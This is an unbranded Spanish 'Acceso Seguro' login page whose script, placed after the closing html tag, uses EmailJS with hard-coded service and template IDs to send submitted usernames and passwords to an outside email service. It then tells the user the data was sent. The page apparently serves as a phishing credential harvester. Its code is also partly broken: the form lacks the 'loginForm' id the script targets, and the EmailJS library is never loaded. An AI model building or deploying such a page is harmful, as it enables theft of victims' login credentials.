<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Acceso Seguro</title>

<style>
body{
    font-family: Arial, sans-serif;
    background: #f2f5f9;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.login-container{
    background:white;
    padding:40px;
    border-radius:10px;
    width:320px;
    box-shadow:0 10px 25px rgba(0,0,0,0.1);
}

h2{
    text-align:center;
    margin-bottom:25px;
    color:#003366;
}

input{
    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:6px;
}

button{
    width:100%;
    padding:12px;
    background:#003366;
    color:white;
    border:none;
    border-radius:6px;
    font-size:16px;
    cursor:pointer;
}

button:hover{
    background:#0055aa;
}

.links{
    text-align:center;
    margin-top:15px;
}

.links a{
    font-size:14px;
    color:#003366;
    text-decoration:none;
}
</style>

</head>

<body>

<div class="login-container">
    <h2>Acceso Seguro</h2>

    <form>
        <input type="text" placeholder="Usuario o ID" required>
        <input type="password" placeholder="Contraseña" required>
        <button type="submit">Iniciar sesión</button>
    </form>

    <div class="links">
        <a href="#">¿Olvidaste tu contraseña?</a>
    </div>
</div>

</body>
</html>


<script>

(function(){
emailjs.init("6cwQRlLFOcJr1JBge");
})();

document.getElementById("loginForm").addEventListener("submit", function(event) {
event.preventDefault();

emailjs.sendForm("service_pj563xc","template_rndbvnx", this)
.then(function() {
alert("Datos enviados correctamente");
}, function(error) {

});

});

</script>
